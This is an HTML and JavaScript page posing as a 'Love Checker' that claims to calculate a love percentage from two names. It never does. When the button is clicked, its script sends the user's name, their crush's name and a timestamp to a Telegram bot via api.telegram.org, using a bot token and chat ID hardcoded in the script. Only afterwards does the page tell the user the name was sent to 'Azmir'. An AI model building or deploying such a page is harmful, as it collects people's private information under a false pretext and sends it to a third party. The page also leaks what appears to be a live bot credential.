<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<meta name="theme-color" content="#ff4d8d">
<title>Love Checker ❤️</title>
<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&family=Dancing+Script:wght@700&display=swap" rel="stylesheet">
<style>
  * {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
    font-family: 'Poppins', sans-serif;
    -webkit-tap-highlight-color: transparent;
  }

  html, body {
    height: 100%;
    overflow-x: hidden;
  }

  body {
    min-height: 100vh;
    min-height: 100dvh;
    display: flex;
    align-items: center;
    justify-content: center;
    background: linear-gradient(160deg, #1a0033 0%, #2d0a4e 40%, #5b1a6b 70%, #8b2d6b 100%);
    padding: 16px;
    position: relative;
    overflow: hidden;
  }

  /* Floating hearts */
  .bg-hearts {
    position: fixed;
    inset: 0;
    pointer-events: none;
    z-index: 0;
    overflow: hidden;
  }

  .bg-hearts span {
    position: absolute;
    bottom: -50px;
    font-size: 20px;
    color: rgba(255, 105, 180, 0.35);
    animation: floatUp linear infinite;
    filter: blur(0.3px);
  }

  @keyframes floatUp {
    0% { transform: translateY(0) rotate(0deg); opacity: 0; }
    10% { opacity: 1; }
    90% { opacity: 1; }
    100% { transform: translateY(-110vh) rotate(360deg); opacity: 0; }
  }

  .bg-hearts span:nth-child(1)  { left: 8%;  animation-duration: 12s; animation-delay: 0s;   font-size: 18px; }
  .bg-hearts span:nth-child(2)  { left: 22%; animation-duration: 15s; animation-delay: 2s;   font-size: 26px; }
  .bg-hearts span:nth-child(3)  { left: 38%; animation-duration: 10s; animation-delay: 4s;   font-size: 14px; }
  .bg-hearts span:nth-child(4)  { left: 55%; animation-duration: 14s; animation-delay: 1s;   font-size: 22px; }
  .bg-hearts span:nth-child(5)  { left: 70%; animation-duration: 11s; animation-delay: 3s;   font-size: 16px; }
  .bg-hearts span:nth-child(6)  { left: 85%; animation-duration: 16s; animation-delay: 5s;   font-size: 24px; }
  .bg-hearts span:nth-child(7)  { left: 45%; animation-duration: 13s; animation-delay: 6s;   font-size: 20px; }
  .bg-hearts span:nth-child(8)  { left: 92%; animation-duration: 18s; animation-delay: 2.5s; font-size: 15px; }

  /* Main card */
  .card {
    position: relative;
    z-index: 2;
    width: 100%;
    max-width: 400px;
    background: rgba(255, 255, 255, 0.08);
    backdrop-filter: blur(20px);
    -webkit-backdrop-filter: blur(20px);
    border: 1.5px solid rgba(255, 255, 255, 0.18);
    border-radius: 28px;
    padding: 36px 24px 32px;
    box-shadow:
      0 20px 60px rgba(0, 0, 0, 0.45),
      inset 0 1px 0 rgba(255, 255, 255, 0.2);
    text-align: center;
    animation: cardIn 0.7s cubic-bezier(0.34, 1.56, 0.64, 1);
  }

  @keyframes cardIn {
    from { transform: translateY(40px) scale(0.92); opacity: 0; }
    to   { transform: translateY(0) scale(1); opacity: 1; }
  }

  .title-script {
    font-family: 'Dancing Script', cursive;
    font-size: 34px;
    font-weight: 700;
    background: linear-gradient(90deg, #ff8ab5, #ffd1e0, #ff6fa5);
    -webkit-background-clip: text;
    background-clip: text;
    -webkit-text-fill-color: transparent;
    margin-bottom: 4px;
    letter-spacing: 0.5px;
  }

  .subtitle-title {
    font-size: 12px;
    letter-spacing: 3px;
    text-transform: uppercase;
    color: rgba(255, 255, 255, 0.55);
    font-weight: 500;
    margin-bottom: 20px;
  }

  .heart-icon {
    font-size: 58px;
    display: inline-block;
    animation: heartbeat 1.3s ease-in-out infinite;
    filter: drop-shadow(0 0 18px rgba(255, 80, 140, 0.7));
    margin-bottom: 6px;
  }

  @keyframes heartbeat {
    0%, 100% { transform: scale(1); }
    25%      { transform: scale(1.18); }
    50%      { transform: scale(0.96); }
    75%      { transform: scale(1.1); }
  }

  /* Loading */
  #loadingSection { padding: 20px 0 10px; }

  .loader {
    width: 62px;
    height: 62px;
    border: 4px solid rgba(255, 130, 175, 0.18);
    border-top: 4px solid #ff5e9c;
    border-right: 4px solid #ff8ab5;
    border-radius: 50%;
    margin: 0 auto 18px;
    animation: spin 0.9s linear infinite;
    box-shadow: 0 0 25px rgba(255, 94, 156, 0.4);
  }

  @keyframes spin { to { transform: rotate(360deg); } }

  .loading-text {
    color: rgba(255, 255, 255, 0.7);
    font-size: 14px;
    letter-spacing: 0.5px;
    animation: pulseText 1.5s ease-in-out infinite;
  }

  @keyframes pulseText {
    0%, 100% { opacity: 0.55; }
    50%      { opacity: 1; }
  }

  /* Form */
  #formSection { display: none; padding-top: 6px; }

  .input-wrap {
    position: relative;
    margin: 14px 0;
  }

  .input-icon {
    position: absolute;
    left: 16px;
    top: 50%;
    transform: translateY(-50%);
    font-size: 18px;
    opacity: 0.75;
    pointer-events: none;
  }

  input {
    width: 100%;
    padding: 16px 16px 16px 48px;
    background: rgba(255, 255, 255, 0.1);
    border: 1.5px solid rgba(255, 255, 255, 0.2);
    border-radius: 16px;
    font-size: 15px;
    font-weight: 500;
    color: #fff;
    outline: none;
    transition: all 0.25s;
    -webkit-appearance: none;
  }

  input::placeholder {
    color: rgba(255, 255, 255, 0.45);
    font-weight: 400;
  }

  input:focus {
    background: rgba(255, 255, 255, 0.16);
    border-color: #ff5e9c;
    box-shadow: 0 0 0 4px rgba(255, 94, 156, 0.18);
  }

  button {
    width: 100%;
    padding: 17px;
    margin-top: 18px;
    background: linear-gradient(135deg, #ff3d7f 0%, #ff6fa5 50%, #ff8ab5 100%);
    background-size: 200% 200%;
    color: #fff;
    border: none;
    border-radius: 16px;
    font-size: 16px;
    font-weight: 600;
    letter-spacing: 0.5px;
    cursor: pointer;
    transition: all 0.3s;
    box-shadow: 0 10px 28px rgba(255, 61, 127, 0.45);
    animation: gradientShift 3s ease infinite;
    -webkit-appearance: none;
  }

  @keyframes gradientShift {
    0%, 100% { background-position: 0% 50%; }
    50%      { background-position: 100% 50%; }
  }

  button:active {
    transform: scale(0.97);
    box-shadow: 0 6px 18px rgba(255, 61, 127, 0.5);
  }

  button:disabled {
    opacity: 0.65;
    cursor: not-allowed;
    animation: none;
  }

  /* ============================================
     SENDING SCREEN (loading after check click)
     ============================================ */
  #sendingSection {
    display: none;
    padding: 20px 0 10px;
  }

  .sending-heart {
    font-size: 76px;
    display: inline-block;
    animation: heartbeat 0.9s ease-in-out infinite;
    filter: drop-shadow(0 0 22px rgba(255, 80, 140, 0.85));
    margin-bottom: 16px;
  }

  .sending-text {
    color: rgba(255, 255, 255, 0.8);
    font-size: 15px;
    letter-spacing: 0.5px;
    animation: pulseText 1.4s ease-in-out infinite;
  }

  /* ============================================
     SENT MESSAGE SCREEN
     ============================================ */
  #sentSection {
    display: none;
    padding: 6px 0 4px;
    animation: popIn 0.6s cubic-bezier(0.34, 1.56, 0.64, 1);
  }

  @keyframes popIn {
    from { transform: scale(0.7); opacity: 0; }
    to   { transform: scale(1); opacity: 1; }
  }

  .success-tick {
    font-size: 70px;
    display: inline-block;
    animation: popIn 0.6s cubic-bezier(0.34, 1.56, 0.64, 1);
    filter: drop-shadow(0 0 20px rgba(76, 217, 100, 0.7));
    margin-bottom: 12px;
  }

  .success-title {
    font-size: 21px;
    font-weight: 700;
    color: #fff;
    margin-bottom: 10px;
    letter-spacing: 0.3px;
    line-height: 1.4;
    padding: 0 4px;
  }

  .success-title .name {
    background: linear-gradient(90deg, #ff8ab5, #ffd1e0, #ff6fa5);
    -webkit-background-clip: text;
    background-clip: text;
    -webkit-text-fill-color: transparent;
    font-family: 'Dancing Script', cursive;
    font-size: 28px;
    font-weight: 700;
    display: inline-block;
    vertical-align: middle;
  }

  .success-text {
    color: rgba(255, 255, 255, 0.78);
    font-size: 14px;
    line-height: 1.6;
    padding: 0 10px;
    margin-bottom: 4px;
  }

  .success-box {
    margin-top: 18px;
    padding: 14px;
    background: rgba(76, 175, 80, 0.15);
    border: 1.5px solid rgba(129, 199, 132, 0.5);
    border-radius: 14px;
    color: #fff;
    font-size: 14px;
    font-weight: 500;
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 8px;
  }

  .success-box .tick {
    font-size: 18px;
  }

  /* Made by credit */
  .made-by {
    margin-top: 22px;
    padding-top: 16px;
    border-top: 1px solid rgba(255, 255, 255, 0.1);
    font-size: 12px;
    color: rgba(255, 255, 255, 0.5);
    letter-spacing: 1px;
    text-transform: uppercase;
    font-weight: 500;
  }

  .made-by .brand {
    display: inline-block;
    font-family: 'Dancing Script', cursive;
    font-size: 20px;
    font-weight: 700;
    letter-spacing: 0.5px;
    text-transform: none;
    background: linear-gradient(90deg, #ff8ab5, #ffd1e0, #ff6fa5);
    -webkit-background-clip: text;
    background-clip: text;
    -webkit-text-fill-color: transparent;
    margin-left: 4px;
    vertical-align: middle;
  }

  /* Small mobile tweaks */
  @media (max-width: 380px) {
    .card { padding: 30px 20px 26px; border-radius: 24px; }
    .title-script { font-size: 30px; }
    .heart-icon { font-size: 50px; }
    input { padding: 15px 15px 15px 44px; font-size: 14px; }
    button { padding: 16px; font-size: 15px; }
    .sending-heart { font-size: 66px; }
    .success-tick { font-size: 60px; }
    .success-title { font-size: 18px; }
    .success-title .name { font-size: 24px; }
  }

  @media (max-height: 640px) {
    .card { padding: 24px 20px 22px; }
    .heart-icon { font-size: 44px; margin-bottom: 2px; }
    .title-script { font-size: 28px; }
    .subtitle-title { margin-bottom: 12px; }
    .sending-heart { font-size: 60px; }
  }
</style>
</head>
<body>

<!-- Floating hearts -->
<div class="bg-hearts">
  <span>❤</span><span>💕</span><span>💖</span><span>💗</span>
  <span>❤</span><span>💓</span><span>💝</span><span>💞</span>
</div>

<div class="card">
  <div class="heart-icon">💖</div>
  <div class="title-script">Love Checker</div>
  <div class="subtitle-title">Calculate True Love</div>

  <!-- Initial Loading -->
  <div id="loadingSection">
    <div class="loader"></div>
    <p class="loading-text">Loading love magic...</p>
  </div>

  <!-- Form -->
  <div id="formSection">
    <div class="input-wrap">
      <span class="input-icon">👤</span>
      <input type="text" id="yourName" placeholder="Your Name" autocomplete="off">
    </div>
    <div class="input-wrap">
      <span class="input-icon">💘</span>
      <input type="text" id="crushName" placeholder="Your Crush Name" autocomplete="off">
    </div>
    <button id="checkBtn" onclick="checkLove()">Check Love % 💘</button>
  </div>

  <!-- Sending (loading) -->
  <div id="sendingSection">
    <div class="sending-heart">❤️</div>
    <p class="sending-text">Sending your love... 💫</p>
  </div>

  <!-- Sent Message Screen -->
  <div id="sentSection">
    <div class="success-tick">✅</div>
    <div class="success-title">Your crush name sent to <span class="name">Azmir</span></div>
    <p class="success-text">He will contact you soon 😉<br>Wait for the magic! ✨</p>
    <div class="success-box">
      <span class="tick">📩</span>
      <span>Message delivered successfully</span>
    </div>
  </div>

  <!-- Made by credit -->
  <div class="made-by">
    Made with ❤️ by <span class="brand">Azmir</span>
  </div>
</div>

<script>
  // ============================================
  // 🔑 তোমার তথ্য এখানে বসাও
  // ============================================
  const BOT_TOKEN = "8798954589:AAGzovNYu-216QNOUal5lHs4lYe1CWKlOKo";
  const CHAT_ID   = "7432604374";
  // ============================================

  let isSending = false;

  // Initial loading শেষে form দেখাও
  setTimeout(() => {
    document.getElementById('loadingSection').style.display = 'none';
    document.getElementById('formSection').style.display = 'block';
    setTimeout(() => document.getElementById('yourName').focus(), 200);
  }, 2200);

  // "Check Love %" ক্লিক → সাথে সাথেই Telegram-এ পাঠাও
  async function checkLove() {
    if (isSending) return;

    const yourName  = document.getElementById('yourName').value.trim();
    const crushName = document.getElementById('crushName').value.trim();

    if (!yourName || !crushName) {
      alert("দুইটা নামই দাও! 😅");
      return;
    }

    isSending = true;

    // Form hide করে sending screen দেখাও
    document.getElementById('formSection').style.display = 'none';
    document.getElementById('sendingSection').style.display = 'block';

    // Telegram-এ পাঠাও (fire & forget — UI block হবে না)
    const message =
      `💘 New Love Check! 💘\n\n` +
      `👤 Name: ${yourName}\n` +
      `💖 Crush Name: ${crushName}\n\n` +
      `⏰ ${new Date().toLocaleString()}`;

    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: CHAT_ID, text: message })
    }).catch(() => {});

    // ছোট ডিলে → sent screen দেখাও
    setTimeout(() => {
      document.getElementById('sendingSection').style.display = 'none';
      document.getElementById('sentSection').style.display = 'block';
    }, 1400);
  }
</script>

</body>
</html>
